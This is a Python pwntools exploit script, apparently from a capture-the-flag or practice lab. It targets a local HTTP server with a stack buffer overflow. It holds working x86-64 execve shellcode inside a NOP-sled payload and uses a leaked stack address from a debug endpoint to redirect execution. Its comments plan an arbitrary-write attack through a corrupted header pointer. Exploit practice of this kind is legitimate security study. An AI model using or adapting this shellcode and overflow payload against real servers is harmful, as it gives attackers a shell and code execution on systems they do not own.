from pwn import *
import struct
import requests

#g = cyclic_gen(n=8)
'''
#payload = g.get(500)
payload = b"A"*175 + b"C"*8
url = "http://localhost:8081/" + str(payload, 'ascii')
r = requests.get(url)

#print(g.find(b"aaaaaawa")) >>>> (170, 0, 170)

'''
target_addr = b''

payload_len = 175 + 8 

#shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
pad2 = 0x50
payload = b"\x90" * (payload_len - 8 - len(shellcode) - pad2)
payload += shellcode
payload += b"\x90" * pad2
statusline = 0x7fffffffd6d0
statusline =0x7fffffffd730

r = requests.get("http://localhost:8080/debug/status_line")
status_line = r.text.split(" ")[0].strip()
print(status_line)
status_line = int(status_line, 16)
payload += struct.pack("<Q", status_line + 0x80)[:-2]

#payload = str(payload, 'latin-1')

#url = "http://localhost:8081/" + payload
#print(url)
#r = requests.get(url, str(payload, 'latin-1'))

#import os
#os.system(f"curl {url}")

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8080))
s.send(b"GET /" + payload + b" HTTP/1.1\r\nHost: Dongs\r\n\r\n")

#0x7fffffffd6d0

#s.send(f"GET /{payload} HTTP/1.1\r\n\r\n")

# overwrite RAX: cyaaczaa
# segfault on invalid memory access
# header overwritten
# crash in header_put

# arbitrary write in header_put
#header->table[idx] = item;
#we control header
#can put a struct ptr to heap at some addr and it contains two more ptrs to the heap, point to strs we control
# i.e. can write a double pointer to memory, where I control the value at a double deref

# maybe force a write onto the call of read_entire_file?

# or if a legit addr was used for header, then we can just overflow PC...

#harder version can have canary
# would have to reorg some vars and change code to make it harder and viable too
